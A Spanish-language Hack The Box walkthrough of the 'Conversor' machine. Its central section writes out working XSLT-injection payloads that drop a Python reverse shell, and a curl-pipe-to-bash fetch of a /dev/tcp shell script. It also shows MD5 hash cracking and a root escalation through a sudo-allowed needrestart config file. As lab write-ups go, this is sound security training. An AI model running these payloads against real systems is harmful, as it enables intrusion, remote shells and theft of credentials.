---
title: "Conversor - Hack The Box"
date: 2025-11-01
draft: false
slug: "htb-writeup-conversor"
excerpt: "Esta fue una máquina sencilla, pero que te puedes perder si no tienes cuidado. Después de analizar los escaneos, vemos que la página web activa en el puerto 80, está usando Virtual Hosting, pues el escaneo nos muestra un dominio. Registramos el dominio en el /etc/hosts y visitamos la página. Resulta ser un login, que nos deja registrarnos como un nuevo usuario. Entrando al login, vemos un dashboard en donde podemos hacer conversiones de archivos XML usando archivos XSLT para generar un archivo HTML. También, vemos que en la sección About, nos comparten el proyecto completo, que después de descargarlo y analizarlo, vemos que es vulnerable a inyecciones XSLT. Aplicamos algunas inyecciones para inyectar un script de Python que ejecuta una Reverse Shell, con la que ganamos acceso principal a la máquina víctima. Dentro, enumeramos la base de datos de la página web, utilizando el comando sqlite3, descubriendo la contraseña de un usuario como un hash MD5, que crackeamos con JohnTheRipper y nos conectamos a la máquina vía SSH. Ya como el nuevo usuario, vemos que puede usar la herramienta needrestart como Root. Investigando la herramienta, resulta que puede leer y ejecutar archivos de texto, si los escribimos con la misma sintaxis que usamos con la librería OS dé Python para ejecutar comandos. Creamos un archivo de texto con una instrucción que nos permitió obtener una shell de Root, logrando escalar privilegios."
categories: ["HackTheBox", "Easy Machine"]
tags: ["Linux", "SSH", "Flask", "Virtual Hosting", "Web Enumeration", "Source Code Analisys", "XSLT Injection", "BurpSuite", "SQLite3 Enumeration", "Cracking Hash", "Cracking MD5 Hash", "Abusing Sudoers Privileges On needrestart Binary", "Privesc - Abusing Sudoers Privileges On needrestart Binary", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "Wappalizer"
  - "file"
  - "tar"
  - "cat"
  - "BurpSuite"
  - "nc"
  - "python3"
  - "grep"
  - "which"
  - "sqlite3"
  - "nano"
  - "JohnTheRipper"
  - "ssh"
  - "sudo"
  - "needrestart"
links:
  - "https://adipsharif.medium.com/attacking-xslt-in-web-applications-ea538a8fb9d0"
  - "https://ine.com/blog/xslt-injections-for-dummies"
  - "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT%20Injection#remote-code-execution-with-native-net"
  - "https://www.atlan.digital/lab/xslt-injection-basics.html"
  - "https://www.revshells.com/"
  - "https://medium.com/@allypetitt/rediscovering-cve-2024-48990-and-crafting-my-own-exploit-ce13829f5e80"
  - "https://github.com/liske/needrestart"
showtoc: true
header:
  teaser: "/assets/images/htb-writeup-conversor/conversor.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 10.10.11.92
PING 10.10.11.92 (10.10.11.92) 56(84) bytes of data.
64 bytes from 10.10.11.92: icmp_seq=1 ttl=63 time=95.7 ms
64 bytes from 10.10.11.92: icmp_seq=2 ttl=63 time=69.9 ms
64 bytes from 10.10.11.92: icmp_seq=3 ttl=63 time=70.7 ms
64 bytes from 10.10.11.92: icmp_seq=4 ttl=63 time=88.8 ms

--- 10.10.11.92 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3003ms
rtt min/avg/max/mdev = 69.865/81.253/95.704/11.259 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.92 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-31 22:43 CST
Initiating SYN Stealth Scan at 22:43
Scanning 10.10.11.92 [65535 ports]
Discovered open port 80/tcp on 10.10.11.92
Discovered open port 22/tcp on 10.10.11.92
Completed SYN Stealth Scan at 22:44, 23.76s elapsed (65535 total ports)
Nmap scan report for 10.10.11.92
Host is up, received user-set (0.20s latency).
Scanned at 2025-10-31 22:43:51 CST for 24s
Not shown: 32859 filtered tcp ports (no-response), 32674 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 24.03 seconds
           Raw packets sent: 117124 (5.153MB) | Rcvd: 34583 (1.383MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Solo tenemos dos puertos abiertos. Supongo que la intrusión será por el **puerto 80**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80 10.10.11.92 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-31 22:44 CST
Nmap scan report for 10.10.11.92
Host is up (0.071s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.52

|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://conversor.htb/
Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.55 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Gracias al escaneo, vemos que la página web activa en el **puerto 80**, nos redirige a un dominio.

Registremos ese dominio en el `/etc/hosts`:
```bash
echo "10.10.11.92 conversor.htb" >> /etc/hosts
```
Con esto, ya podemos visitar la página para analizarla correctamente.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/htb-writeup-conversor/Captura1.png">
</p>

Solo vemos un login.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/htb-writeup-conversor/Captura2.png">
</p>

No nos da mucha información.

Como no tenemos credenciales válidas, podríamos tratar de aplicar **inyecciones SQL**, pero tenemos un botón que nos indica que podemos registrarnos como un nuevo usuario:

<p align="center">
<img src="/assets/images/htb-writeup-conversor/Captura3.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-conversor/Captura4.png">
</p>

Una vez registrados, ya podemos entrar al login y ver el dashboard:

<p align="center">
<img src="/assets/images/htb-writeup-conversor/Captura5.png">
</p>

Veamos qué nos reporta **Wappalizer**:

<p align="center">
<img src="/assets/images/htb-writeup-conversor/Captura6.png">
</p>

Nada nuevo como tal.

Esta página nos sirve para hacer una conversión entre un **archivo XML** y una plantilla de un **archivo XSLT**, siendo solo para convertir nuestros escaneos de **nmap** en **archivos HTML**.

También nos comparten una plantilla de **XSLT**, para que la usemos como prueba.

Pero, ¿Qué es un **archivo XSLT**?

| **Archivo XSLT** |
|:----------------:|
| *Un archivo XSLT (eXtensible Stylesheet Language Transformations) es una hoja de estilo que describe cómo transformar un documento XML en otro documento (por ejemplo HTML, texto plano o incluso otro XML). Específicamente, XSLT usa XPath para seleccionar nodos del XML fuente y plantillas (<xsl:template>) para producir la salida. Se suele guardar con extensión .xsl o .xslt.* |

En resumen, es para que un **archivo XML**, se transforme a un **archivo HTML**.

Si nos vamos a la sección de **About**, veremos un mensaje donde nos comparten el proyecto completo, es decir, los archivos que utilizaron para crear su página web, con tal de que apoyemos a reportar cualquier riesgo de seguridad:

<p align="center">
<img src="/assets/images/htb-writeup-conversor/Captura7.png">
</p>

Descarguemos ese archivo comprimido y analicemos el contenido.

### Analizando Archivos del Proyecto Descargado {#Codigo}

Veamos primero de qué forma está comprimido el archivo:
```bash
file source_code.tar.gz
source_code.tar.gz: POSIX tar archive (GNU)
```
Solo esta comprimido por **tar**.

Descomprímelo:
```bash
tar -xvf source_code.tar.gz

ls

```
Observa que el contenido tiene la misma estructura que una aplicación creada para **Flask**.

Vamos a leer primero la forma de instalar el proyecto, leyendo el archivo **install.md**:
```bash
cat source/install.md
To deploy Conversor, we can extract the compressed file:

"""
tar -xvf source_code.tar.gz
"""

We install flask:

"""
pip3 install flask
"""

We can run the app.py file:

"""
python3 app.py
"""

You can also run it with Apache using the app.wsgi file.

If you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to your /etc/crontab.

"""
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
"""
```
En efecto, es una aplicación web creada con **Flask**.

Pero aquí me llama la atención el mensaje que nos dejan los creadores, ya que la instalación crea una **tarea CRON** que ejecutara cualquier script de **Python** que esté dentro de la ruta `/var/www/conversor.htb/scripts/`.

Además, podemos ver cómo se configura la ruta de la aplicación web.

Ahora analicemos el script **app.py**:
```bash
cat source/app.py
from flask import Flask, render_template, request, redirect, url_for, session, send_from_directory
import os, sqlite3, hashlib, uuid

app = Flask(__name__)
app.secret_key = 'Changemeplease'

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = '/var/www/conversor.htb/instance/users.db'
UPLOAD_FOLDER = os.path.join(BASE_DIR, 'uploads')
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
...
def init_db():
    os.makedirs(os.path.join(BASE_DIR, 'instance'), exist_ok=True)
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
...
@app.route('/register', methods=['GET','POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = hashlib.md5(request.form['password'].encode()).hexdigest()
        conn = get_db()
...
@app.route('/convert', methods=['POST'])
def convert():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    xml_file = request.files['xml_file']
    xslt_file = request.files['xslt_file']
    from lxml import etree
    xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename)
    xslt_path = os.path.join(UPLOAD_FOLDER, xslt_file.filename)
    xml_file.save(xml_path)
    xslt_file.save(xslt_path)
    try:
        parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)
        xml_tree = etree.parse(xml_path, parser)
        xslt_tree = etree.parse(xslt_path)
        transform = etree.XSLT(xslt_tree)
        result_tree = transform(xml_tree)
        result_html = str(result_tree)
        file_id = str(uuid.uuid4())
        filename = f"{file_id}.html"
        html_path = os.path.join(UPLOAD_FOLDER, filename)
        with open(html_path, "w") as f:
            f.write(result_html)
        conn = get_db()
        conn.execute("INSERT INTO files (id,user_id,filename) VALUES (?,?,?)", (file_id, session['user_id'], filename))
        conn.commit()
        conn.close()
        return redirect(url_for('index'))
    except Exception as e:
        return f"Error: {e}"
...
```
Solamente copié las partes del script que nos pueden dar información valiosa.

Esto es lo que podemos encontrar en este script:
* Al principio vemos las librerías que se están usando, la ubicación de la llave secreta y la ruta de la base de datos, siendo `/var/www/conversor.htb/instance/users.db`.
* Un poco abajo, vemos la función para conectarse a la BD y vemos que se está usando **SQLite3**, algo que también podemos notar en las librerías usadas.
* Bajando más, vemos la función **register()**, donde descubrimos que las contraseñas de cada registro, se convierten en **hashes MD5**, pero no vemos que se le agregue un **salt** para más seguridad, lo que los hace fácilmente crackeables.
* Más abajo, vemos la función **convert()**, siendo esta la que se encarga de hacer las conversiones usando el **archivo XML y XSLT**, dando resultado a un **archivo HTML**.
* Y al final, vemos la función **view_file()**, que es la que muestra el archivo convertido en el dashboard.

El problema de toda la aplicación, se encuentra en la función **convert()**, más en específico, esta sección:
```bash
try:
        parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)
        xml_tree = etree.parse(xml_path, parser)
        xslt_tree = etree.parse(xslt_path)
        transform = etree.XSLT(xslt_tree)
        result_tree = transform(xml_tree)
        result_html = str(result_tree)
```
El **XSLT** se parsea sin restricciones, usando `etree.parse(xslt_path)`directamente.

Luego se ejecuta con `transform(xml_tree)`, lo que permite ejecutar **instrucciones XSLT arbitrarias**, es decir, **inyecciones XSLT**.

Tratemos de aplicar estas inyecciones.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando XSLT Injections para Inyectar Scripts de Python {#XSLTi}

¿Qué son las **Inyecciones XSLT**?

| **Inyecciones XSLT** |
|:--------------------:|
| *Una inyección XSLT (XSLT Injection) ocurre cuando una aplicación acepta una hoja XSLT proporcionada por el usuario y la ejecuta en el servidor sobre datos XML sin validar/sandboxear esa hoja. Porque XSLT no es solo “plantillas”; puede usar funciones (p. ej. document(), xsl:message, llamadas a URI) que permiten leer archivos, consultar URLs internas, o provocar información útil en los errores. Eso convierte una funcionalidad legítima de transformación en un vector de ataque.Una inyección XSLT (XSLT Injection) ocurre cuando una aplicación acepta una hoja XSLT proporcionada por el usuario y la ejecuta en el servidor sobre datos XML sin validar/sandboxear esa hoja. Porque XSLT no es solo “plantillas”; puede usar funciones (p. ej. document(), xsl:message, llamadas a URI) que permiten leer archivos, consultar URLs internas, o provocar información útil en los errores. Eso convierte una funcionalidad legítima de transformación en un vector de ataque.* |

Estas inyecciones nos pueden ayudar a:
* Leer otros documentos (locales o remotos) mediante funciones del procesador.
* Inyectar datos arbitrarios en la salida (HTML/texto), lo que facilita exfiltración.
* Puede usar mensajes de error o `xsl:message` para filtrar contenido.
* Y si el procesador permite extensiones, puede ejecutar código más allá de **XSLT** (según el stack).

Te comparto estos 3 blogs que nos explican cómo aplicar **inyecciones XSLT**, pero te recomiendo prestar bastante atención al de **PayloadAllTheThings**:
* <a href="https://adipsharif.medium.com/attacking-xslt-in-web-applications-ea538a8fb9d0" target="_blank">Attacking XSLT in Web Applications</a>
* <a href="https://ine.com/blog/xslt-injections-for-dummies" target="_blank">XSLT Injections for Dummies</a>
* <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT%20Injection" target="_blank">PayloadAllTheThings: XSLT Injection</a>

Para que el conversor funcione, tenemos que darle un **archivo XML** y el **archivo XSLT**.

Podemos crear el **XML** de manera simple:
```bash
cat test.xml
<?xml version="1.0" encoding="utf-8"?>
<root />
```

Y creamos nuestro **archivo XSLT**, agregándole una inyección que nos permita leer un archivo interno:
```bash
cat test.xslt
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:template match="/">
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')"/>
</xsl:template>
</xsl:stylesheet>
```

Para que podamos hacer más pruebas sin tener que estar subiendo los archivos cada vez, capturaremos la carga de los archivos con **BurpSuite** y la mandaremos al **Repeater**:

<p align="center">
<img src="/assets/images/htb-writeup-conversor/Captura8.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-conversor/Captura9.png">
</p>

Observa que la inyección no fue exitosa.

Podríamos tratar de ver un archivo interno, es decir, de la aplicación web como el script **app.py** o tratar de leer un archivo remoto, que sería un **SSRF**, pero ninguno de estos servirá.

Recordemos que al leer el archivo **install.md**, nos dicen que la ruta `/var/www/conversor.htb/scripts/*.py` puede ser usada para ejecutar scripts de **Python**, pues al instalar el proyecto, se crea una **tarea CRON** para esto.

Entonces, tratemos de inyectar un script que nos mande una **Reverse Shell**, que justo **PayloadAllTheThings** nos indica cómo hacerlo:

<p align="center">
<img src="/assets/images/htb-writeup-conversor/Captura10.png">
</p>

#### Inyectando un Script de Python con una Reverse Shell {#revShell1}

Primero, abre un listener con **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
```

Utilizaremos la inyección que nos da **PayloadAllTheThings**, pero debemos cambiar la ruta para indicar dónde debe guardarse y escribiremos el código que se va a ejecutar, quedando así:
```bash
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exploit="http://exslt.org/common" 
  extension-element-prefixes="exploit"
  version="1.0">
  <xsl:template match="/">
    <exploit:document href="/var/www/conversor.htb/scripts/revShell2.py" method="text">import os,pty,socket;s=socket.socket();s.connect(("Tu_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")</exploit:document>
  </xsl:template>
</xsl:stylesheet>
```

Cópiala en la petición que tenemos en el **Repeater** de **BurpSuite** y ejecútala:

<p align="center">
<img src="/assets/images/htb-writeup-conversor/Captura11.png">
</p>

Observa que no nos dio ningún error y en el dashboard de la página, nos aparece el link de nuestro archivo convertido:

<p align="center">
<img src="/assets/images/htb-writeup-conversor/Captura12.png">
</p>

Si entras en ese link, no verás nada, pero si regresas a la **netcat**, verás que ya estamos dentro:
```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.11.92] 33638
www-data@conversor:~$ whoami
whoami
www-data
```

Obtengamos una sesión interactiva:
```bash
# Paso 1:
script /dev/null -c bash

# Paso 2:
CTRL + Z

# Paso 3:
stty raw -echo; fg

# Paso 4:
reset -> xterm

# Paso 5:
export TERM=xterm && export SHELL=bash && stty rows 51 columns 189
```

#### Inyectando Script de Python que Lee Archivo Remoto y Ejecuta una Reverse Shell {#revShell2}

Digamos que por X o Y motivo, la inyección de la **Reverse Shell** no funciona, entonces tenemos otra opción, que sería inyectar un script que aplica un **curl** hacia un servidor local de nosotros, para que lea y ejecute un script de **Bash** que contiene una **Reverse Shell**.

Abre un listener con **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
```

Levanta un servidor con **Python**:
```bash
python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Este es el script que contiene la **Reverse Shell**:
```bash
cat shell.sh
bash -c 'bash -i >& /dev/tcp/Tu_IP/443 0>&1'
```

Utilizamos la misma inyección que en el ejemplo anterior, solo modificada:
```bash
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exploit="http://exslt.org/common" 
  extension-element-prefixes="exploit"
  version="1.0">
  <xsl:template match="/">
    <exploit:document href="/var/www/conversor.htb/scripts/shell.py" method="text">import os; os.system("curl http://Tu_IP:8000/shell.sh | bash")</exploit:document>
  </xsl:template>
</xsl:stylesheet>
```

Cópiala en la petición que tenemos en el **Repeater** de **BurpSuite** y ejecútala:

<p align="center">
<img src="/assets/images/htb-writeup-conversor/Captura13.png">
</p>

Igual que la anterior, no nos dio ningún error y en el dashboard de la página, nos aparece el link de nuestro archivo convertido (encontramos más, pero son de otros compañeros hackers):

<p align="center">
<img src="/assets/images/htb-writeup-conversor/Captura14.png">
</p>

Si entras en ese link, no verás nada, pero si regresas a la **netcat**, verás que ya estamos dentro:
```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.11.92] 33638
www-data@conversor:~$ whoami
whoami
www-data
```

Obtengamos una sesión interactiva:
```bash
# Paso 1:
script /dev/null -c bash

# Paso 2:
CTRL + Z

# Paso 3:
stty raw -echo; fg

# Paso 4:
reset -> xterm

# Paso 5:
export TERM=xterm && export SHELL=bash && stty rows 51 columns 189
```
Continuemos.

## Post Explotación {#Post}

### Enumeración de Base de Datos de SQLite3 y Crackeo de Hashes MD5 {#usersDB}

Veamos dónde nos encontramos:
```bash
www-data@conversor:~$ pwd
/var/www
www-data@conversor:~$ ls
conversor.htb
```
Muy bien, estamos en el directorio donde se guarda la aplicación web.

Antes de investigar más, veamos qué usuarios existen en la máquina:
```bash
www-data@conversor:~$ cat /etc/passwd | grep 'bash'
root:x:0:0:root:/root:/bin/bash
fismathack:x:1000:1000:fismathack:/home/fismathack:/bin/bash
```
Solo hay un usuario, aparte del **Root** y curiosamente, este mismo usuario lo vemos en la sección **About** de la página web.

No podremos ver el contenido de su directorio:
```bash
www-data@conversor:~$ ls -la /home
total 12
drwxr-xr-x  3 root       root       4096 Jul 31 01:37 .
drwxr-xr-x 19 root       root       4096 Oct 21 05:45 ..
drwxr-x---  5 fismathack fismathack 4096 Oct 21 05:45 fismathack
```

Uno de los archivos que son de nuestro interés, es la base de datos que se encuentra en la ruta `/conversor.htb/instance`:
```bash
www-data@conversor:~$ cd conversor.htb/instance/
www-data@conversor:~/conversor.htb/instance$ ls
users.db
```

Pero recuerda que es una base de datos de **SQLite3**, por lo que si intentas verla, puede que no sea del todo legible:
```bash
www-data@conversor:~/conversor.htb/instance$ file users.db 
users.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 21, database pages 6, cookie 0x2, schema 4, UTF-8, version-valid-for 21
```

Podemos usar la herramienta **sqlite3** para aplicar consultas a esta BD:
```bash
www-data@conversor:~/conversor.htb/instance$ which sqlite3
/usr/bin/sqlite3
www-data@conversor:~/conversor.htb/instance$ sqlite3 users.db ".tables"
files  users
```

Obtengamos los usuarios y contraseñas de la tabla **users**:
```bash
www-data@conversor:~/conversor.htb/instance$ sqlite3 users.db "SELECT id, username, password FROM users;"
1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
5|root|63a9f0ea7bb98050796b649e85481845
...
```
Perfecto, observa que son **hashes MD5** y la que nos interesa es del **usuario fismathack**.

Copia el hash en un archivo de texto en tu máquina para que podamos crackearlo con **JohnTheRipper**:
```bash
nano hash.txt
john -w:/usr/share/wordlists/rockyou.txt hash.txt --format=raw-md5
Using default input encoding: UTF-8
Loaded 1 password hashes with no different salts (Raw-MD5 [MD5 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=6
Press 'q' or Ctrl-C to abort, almost any other key for status
********** (?)     
2g 0:00:00:00 DONE (2025-11-02 00:28) 2.247g/s 16116Kp/s 16116Kc/s 29352KC/s  fuckyooh21..*7¡Vamos!
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```
Tenemos la contraseña.

Podemos autenticarnos con este usuario desde nuestra sesión actual o vía **SSH**.

Yo elegiré lo segundo:
```bash
ssh fismathack@10.10.11.92
fismathack@10.10.11.92's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-160-generic x86_64)
...
Last login: Sun Nov 2 06:29:24 2025
fismathack@conversor:~$ whoami
fismathack
```

Aquí encontraremos la flag del usuario:
```bash
fismathack@conversor:~$ ls
user.txt
fismathack@conversor:~$ cat user.txt
...
```

### Abusando de Permisos Sudoers sobre Binario needrestart para Escalar Privilegios {#needrestart}

Veamos qué privilegios tiene nuestro usuario:
```bash
fismathack@conversor:~$ sudo -l
Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```
Podemos usar el binario **needrestart** como **Root**.

Investiguemos un poco para qué sirve este binario:

| **Binario needrestart** |
|:-----------------------:|
| *needrestart es una utilidad (y paquete) que comprueba si, tras actualizaciones de paquetes o cambios en bibliotecas/kerneI, hay procesos en ejecución que usan versiones antiguas de archivos (por ejemplo bibliotecas compartidas, módulos del kernel, o archivos eliminados) y que por tanto deberían reiniciarse para que los cambios tengan efecto. Su objetivo es ayudar a administradores y usuarios a decidir si reiniciar servicios o el sistema completo después de una actualización.* |

Entonces, se encarga de revisar las actualizaciones del sistema.

Veamos si hay alguna pendiente:
```bash
fismathack@conversor:~$ sudo /usr/sbin/needrestart
Scanning processes...                                                                                                                                                                         
Scanning linux images...                                                                                                                                                                      

Running kernel seems to be up-to-date.

No services need to be restarted.

No containers need to be restarted.

No user sessions are running outdated binaries.

No VM guests are running outdated hypervisor (qemu) binaries on this host.
```
No hay ninguna.

Leamos cómo se usa este binario:
```bash
fismathack@conversor:~$ sudo /usr/sbin/needrestart --help

needrestart 3.7 - Restart daemons after library updates.
...
Usage:

  needrestart [-vn] [-c <cfg>] [-r <mode>] [-f <fe>] [-u <ui>] [-(b|p|o)] [-klw]

    -v		be more verbose
    -q		be quiet
    -m <mode>	set detail level
	e	(e)asy mode
	a	(a)dvanced mode
    -n		set default answer to 'no'
    -c <cfg>	config filename
    -r <mode>	set restart mode
	l	(l)ist only
	i	(i)nteractive restart
	a	(a)utomatically restart
    -b		enable batch mode
...
```
Observa el parámetro **-c**, que parece servir para leer y ejecutar archivos de configuración.

Si investigamos cómo funciona este binario, resulta estar hecho con **Python**.

Aunque la versión actual (**3.7**) puede ser vulnerable a un Exploit (**CVE-2024–48990**), en realidad no lo es.

Pero, podemos abusar del parámetro **-c** porque, como mencionaba, permite pasar un archivo que el binario lee/ejecuta en su contexto. 

Si dicho archivo contiene código que ejecute comandos, como lo hacemos normalmente con la **librería OS**, es posible que podamos crear un archivo que ejecute la **Bash** y nos dé una sesión del **Root**.

Usaríamos la misma sintaxis que usamos con la **librería OS**:
```bash
fismathack@conversor:~$ cat privesc.txt 
system("/bin/bash")
```

Observa lo que pasa cuando lo leemos con **needrestart**:
```bash
fismathack@conversor:~$ sudo /usr/sbin/needrestart -c ./privesc.txt
root@conversor:/home/fismathack# whoami
root
```
Somos **Root**.

Obtengamos la última flag:
```bash
root@conversor:/home/fismathack# cd /root/
root@conversor:~# ls
root.txt  scripts
root@conversor:~# cat root.txt
...
```
Y con esto terminamos la máquina.
